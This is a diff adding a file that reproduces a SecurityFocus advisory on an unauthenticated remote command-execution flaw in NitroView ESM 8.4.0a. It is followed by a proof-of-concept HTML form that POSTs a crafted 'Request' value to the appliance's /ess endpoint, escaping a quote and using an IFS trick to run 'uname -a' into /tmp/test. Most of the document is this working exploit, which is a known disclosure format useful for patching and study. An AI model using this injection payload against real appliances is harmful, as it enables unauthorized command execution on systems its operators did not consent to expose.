@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/44421/info
+
+NitroView ESM is prone to a remote command-execution vulnerability because it fails to adequately sanitize user-supplied input.
+
+Successful attacks may allow an attacker to execute arbitrary commands on the appliance in the context of the webserver process.
+
+NitroView ESM 8.4.0a is affected; other versions may also be vulnerable.
+
+<html> <pre> [*] Tested on v8.4.0a "NitroSecurity 2.6.22.19-24nssmp64 GNU/Linux" [*] No authentication required [*] "ESSPMDebug=1" in "/usr/local/ess/CPConsoleServer.cfg" required </pre> <form action="https://x.x.x.x/ess"; method="POST"> <input type="text" name="Request" value="A';c='uname:-a';IFS=:;$c>>/tmp/test;'" <input type="hidden" name="debug" value="1"> <input type="submit" value="Oops()"> </form> </html> 
